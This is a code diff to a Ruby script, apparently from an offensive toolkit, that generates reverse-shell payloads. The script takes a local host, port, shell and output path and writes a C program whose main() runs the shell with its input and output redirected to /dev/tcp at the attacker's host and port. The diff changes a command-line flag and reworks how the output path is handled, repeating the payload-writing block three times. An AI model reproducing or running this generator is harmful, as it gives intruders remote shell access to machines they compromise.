@@ -30,7 +30,7 @@ require 'ostruct'
 
 options = OpenStruct.new
 OptionParser.new do |opt|
-  opt.on('-h', '--local-host <local_host>', 'Local host.') { |o| options.local_host = o }
+  opt.on('-l', '--local-host <local_host>', 'Local host.') { |o| options.local_host = o }
   opt.on('-p', '--local-port <local_port>', 'Local port.') { |o| options.local_port = o }
   opt.on('-s', '--target-shell <target_shell>', 'Target shell.') { |o| options.target_shell = o }
   opt.on('-o', '--output-path <output_path>', 'Output path.') { |o| options.output_path = o }
@@ -51,23 +51,68 @@ if host == "" or port == "" or shell == "" or file == ""
     puts "  --output-path=<output_path>    Output path."
 end
   
-begin
-    sleep(0.5)
-    puts "#{g}Generating payload..."
-    sleep(1)
-    puts "#{g}Saving to #{file}..."
-    sleep(0.5)
-    w = ENV['OLDPWD']
-    Dir.chdir(w)
-    open(file, 'w') { |f|
-        f.puts "#include <stdio.h>"
-        f.puts "int main() {"
-        f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
-        f.puts "}"
-    }
-    g = ENV['HOME']
-    Dir.chdir(g + "/thoron")
-    puts "#{s}Saved to #{file}!"
-rescue
-    puts "#{e}Failed to generate payload!"
+if File.directory? file
+    if File.exists? file
+        if file[-1] == "/"
+            file = "#{file}payload.c"
+            sleep(0.5)
+            puts "#{g}Generating payload..."
+            sleep(1)
+            puts "#{g}Saving to #{file}..."
+            sleep(0.5)
+            open(file, 'w') { |f|
+                f.puts "#include <stdio.h>"
+                f.puts "int main() {"
+                f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "}"
+            }
+            puts "#{s}Saved to #{file}!"
+        else
+            file = "#{file}/payload.c"
+            sleep(0.5)
+            puts "#{g}Generating payload..."
+            sleep(1)
+            puts "#{g}Saving to #{file}..."
+            sleep(0.5)
+            open(file, 'w') { |f|
+                f.puts "#include <stdio.h>"
+                f.puts "int main() {"
+                f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "}"
+            }
+            puts "#{s}Saved to #{file}!"
+        end
+    else
+        puts "#{e}Output directory: #{file}: does not exist!"
+        abort()
+    end
+else
+    direct = File.dirname(file)
+    if direct == ""
+        direct = "."
+    else
+        nil
+    end
+    if File.exists? direct
+        if File.directory? direct
+            sleep(0.5)
+            puts "#{g}Generating payload..."
+            sleep(1)
+            puts "#{g}Saving to #{file}..."
+            sleep(0.5)
+            open(file, 'w') { |f|
+                f.puts "#include <stdio.h>"
+                f.puts "int main() {"
+                f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "}"
+            }
+            puts "#{s}Saved to #{file}!"
+        else
+            puts "#{e}Error: #{direct}: not a directory!"
+            abort()
+        end
+    else
+        puts "#{e}Output directory: #{direct}: does not exist!"
+        abort()
+    end
 end
